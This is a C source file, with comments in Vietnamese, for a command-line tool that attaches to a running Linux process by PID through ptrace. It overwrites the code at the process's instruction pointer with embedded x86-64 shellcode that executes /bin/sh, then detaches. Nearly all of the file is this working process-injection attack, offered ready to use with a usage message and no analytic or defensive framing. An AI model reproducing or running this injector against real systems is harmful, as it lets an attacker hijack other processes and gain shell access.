#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/user.h>
#include <sys/reg.h>


#define shellcode_size 27
char shellcode[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"; 

int main(int argc, char**argv)
{
	pid_t target;
	struct user_regs_struct regs;
	int syscall;
	long dst; 

	if(argc != 2)
	{
		printf("USAGE ./inject [pid]\n");
		exit(0);
	}

	target = atoi(argv[1]);
	printf("[+] tracing process %d\n", target);

	//attach process 
	if (ptrace(PTRACE_ATTACH, target, NULL, NULL))
	{
		perror("[-] PTRACE_ATTACH error\n");
		exit(0);
	}

	printf ("[+] Waiting for process...\n");
  	wait (NULL);
  	
  	//lay gia tri cac thanh ghi cua process
	if (ptrace(PTRACE_GETREGS, target, NULL, &regs) < 0)
	{
		perror("[-] PTRACE_GETREGS error\n");
		exit(0);
	}

	//dia chi cua thanh ghi rip 
	printf("[+] rip register of process is at %p\n", (void *)regs.rip);
	

	uint32_t *s = (uint32_t *)shellcode;
	uint32_t *d = (uint32_t *)regs.rip;


	//ghi shellcode vao memory cua process bi inject 
	for(int i = 0; i < shellcode_size; i+=4, s++, d++)
	{
		if((ptrace(PTRACE_POKETEXT, target, d, *s)) < 0)
		{
			perror("[-] PTRACE_POKETEXT error\n");
			exit(0);
		}
	}

	printf("[+] done injectting shellcode\n");

	regs.rip += 2;
	printf ("[+] Setting instruction pointer to %p\n", (void*)regs.rip);
	
	//dat lai gia tri cac thanh ghi cua process tu cac gia tri lay duoc ban dau
		if((ptrace(PTRACE_SETREGS, target, NULL, &regs)) < 0)
	{
		perror("PTRACE_SETREGS ERROR");
		exit(1);
	}

	
	if((ptrace(PTRACE_DETACH, target, NULL, NULL)) < 0)
	{
		perror("[-] PTRACE_DETACH error");
		exit(1);
	}


	return 0;
}
